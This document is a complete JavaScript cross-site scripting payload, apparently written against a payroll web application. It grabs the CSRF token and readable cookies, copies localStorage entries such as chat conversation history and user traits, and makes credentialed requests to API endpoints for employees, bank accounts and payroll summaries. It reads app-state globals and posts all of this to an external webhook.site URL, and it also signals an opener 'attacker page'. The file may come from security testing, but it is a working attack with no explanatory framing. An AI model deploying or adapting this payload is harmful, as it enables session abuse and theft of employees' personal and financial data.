(async () => {
  const WEBHOOK = 'https://webhook.site/12a35676-d3a6-40e5-998b-f053b949ecbf';
  const opener  = window.opener;

  // ── Visual confirmation (visible in popup tab)
  document.title = '[XSS:CONFIRMED] ' + document.domain;
  try { document.body.style.outline = '6px solid red'; } catch(e){}

  // ── Signal attacker page
  const signal = (type, extra) => {
    if (opener) try { opener.postMessage({ type, domain: document.domain, ...extra }, '*'); } catch(e){}
  };

  // ── Grab JS-accessible cookies (session cookie is HttpOnly but CSRF-TOKEN is not)
  const allCookies = document.cookie;
  const csrfMatch  = allCookies.match(/(?:^|;\s*)CSRF-TOKEN=([^;]+)/);
  const csrfToken  = csrfMatch ? csrfMatch[1] : null;
  signal('ym-xss-fired', { csrfToken });

  // ── Interesting localStorage keys (Yellow conversation history, session refs)
  const lsOut = {};
  const lsKeys = ['conversation_history__DARTH_VADERS__x1644519963787',
                  'anon_jid__DARTH_VADERS__x1644519963787',
                  'ajs_user_id', 'ajs_user_traits', 'rzp_utm'];
  for (const k of lsKeys) {
    const v = localStorage.getItem(k);
    if (v) lsOut[k] = v.slice(0, 600);
  }

  // ── Probe authenticated API endpoints (cookies auto-attached — HttpOnly included)
  const headers = { 'Content-Type': 'application/json' };
  if (csrfToken) {
    headers['X-CSRF-Token']  = csrfToken;
    headers['X-CSRF-TOKEN']  = csrfToken;
    headers['CSRF-Token']    = csrfToken;
  }

  const endpoints = [
    '/api/v1/users/me',
    '/api/v1/me',
    '/api/me',
    '/api/user',
    '/api/v1/user',
    '/api/v1/employees',
    '/api/v1/org',
    '/api/v1/organization',
    '/api/v1/bank-accounts',
    '/api/v1/payroll/summary',
  ];

  const apiResults = {};
  await Promise.allSettled(endpoints.map(async ep => {
    try {
      const r = await fetch(ep, { credentials: 'include', headers });
      const body = await r.text();
      apiResults[ep] = { status: r.status, body: body.slice(0, 800) };
      signal('ym-xss-endpoint', { endpoint: ep, status: r.status, snippet: body.slice(0, 120) });
    } catch(e) {
      apiResults[ep] = { error: e.message };
    }
  }));

  // ── Window globals (React/Redux state often exposed)
  const globals = {};
  for (const g of ['__INITIAL_STATE__', '__REDUX_STATE__', '__APP_STATE__', 'store', '__store', 'reduxStore']) {
    try { if (window[g]) globals[g] = JSON.stringify(window[g]).slice(0, 800); } catch(e){}
  }

  // ── Exfiltrate everything to webhook
  await fetch(WEBHOOK + '?src=rzp-payroll-ym-xss&domain=' + encodeURIComponent(document.domain), {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      domain:     document.domain,
      url:        location.href,
      csrfToken,
      cookies:    allCookies.slice(0, 800),
      localStorage: lsOut,
      api:        apiResults,
      globals
    }),
    headers: { 'Content-Type': 'application/json' }
  });
})();
